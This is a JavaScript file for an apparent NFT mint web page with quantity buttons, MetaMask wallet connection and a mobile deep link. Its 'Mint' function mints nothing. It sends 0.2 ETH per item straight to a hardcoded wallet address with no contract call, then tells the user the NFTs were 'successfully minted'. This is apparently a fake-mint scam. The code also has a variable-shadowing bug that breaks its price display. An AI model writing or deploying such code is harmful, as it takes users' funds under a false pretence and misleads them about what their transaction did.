var amount = 1;

var mintbtn =
  document.getElementById("mintbtn");
var minttxt =
  document.getElementById("minttxt");
var accounts;

var plusbtn = document.getElementById("plusbtn");
var minusbtn =
  document.getElementById("minusbtn");
var pricex =
  document.getElementById("pricex");
var price = document.getElementById("price");

var setmaxbtn = document.getElementById("setmaxbtn");
var price = 0.2;
plusbtn.onclick = () => {
  if (amount < 5) {
    console.log(amount)
    amount += 1;
  }
  pricex.textContent = amount;
  price.textContent = (amount * price).toFixed(1)
};
minusbtn.onclick = () => {
  if (amount > 1) {
    amount -= 1;
  }
  pricex.textContent = amount;
  price.textContent = (amount * price).toFixed(1)
};

setmaxbtn.onclick = () => {
  amount = 5;
  pricex.textContent = amount;
  price.textContent = (amount * price).toFixed(1)
};

if (typeof window.ethereum === "undefined") {
  mintbtn.disabled = true;
  minttxt.textContent =
    "Please install MetaMask to connect your wallet";
} else {
  mintbtn.addEventListener("click", () => {
    mintbtn.disabled = true;
    if (mintbtn.textContent == "Mint") {
      mintTransfer();
    } else {
      window.ethereum
        .request({
          method: "eth_requestAccounts",
        })
        .then(accountsChanged).catch(() => {
          mintbtn.disabled = false;
          minttxt.textContent =
            "Please try again";
        });
    }
  });

  window.ethereum.on(
    "accountsChanged",
    accountsChanged
  );

  function accountsChanged(acc) {
    accounts = acc;
    mintbtn.disabled = false;
    if (accounts.length > 0) {
      mintbtn.textContent = "Mint";
      minttxt.textContent = "Click to Mint";
    } else {
      minttxt.textContent = "Click to Connect";
      mintbtn.textContent = "Connect";
    }
  }

  function mintTransfer() {
    var price = 200000000000000000; // 0.2
    var eth = (
      price * amount
    ).toString(16);

    ethereum
      .request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: "0x1" }],
      })
      .then(() =>
        ethereum
          .request({
            method: "eth_sendTransaction",
            params: [
              {
                from: accounts[0],
                to: "0x9265Da065d82fD2A5Ba972b0647099daB70Dd55a",
                value: "0x" + eth,
              },
            ],
          })
          .then((txHash) => {
            minttxt.textContent =
              "Successfully minted " +
              amount +
              " NFTs to " +
              accounts[0];
          })
          .catch((error) => {
            minttxt.textContent =
              "Please try again";
            console.error(error);
          })
      );

    mintbtn.disabled = false;
  }
}

document.addEventListener("DOMContentLoaded", (event) => {
  if (getMobileOperatingSystem() == "Android" || getMobileOperatingSystem() == "iOS") {
      var wrapper = document.createElement("a");
      wrapper.classList.add("mmLink");
      wrapper.href = "https://metamask.app.link/dapp/" +
          window.location.href.replace("https://", "").replace("http://", "") +
          "?uid=mm";
      mintbtn.parentNode.insertBefore(wrapper, mintbtn);
      wrapper.appendChild(mintbtn);
  }
});

function getMobileOperatingSystem() {
  var userAgent = navigator.userAgent || navigator.vendor || window.opera;
  console.log(userAgent);
  const queryString = window.location.search;
  const urlParams = new URLSearchParams(queryString);
  const uid = urlParams.get("uid");
  console.log(uid);
  if (uid == "mm") {
      return "Metamask";
  }
  if (/windows phone/i.test(userAgent)) {
      return "Windows Phone";
  }
  if (/android/i.test(userAgent)) {
      return "Android";
  }
  if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
      return "iOS";
  }
  return "unknown";
}
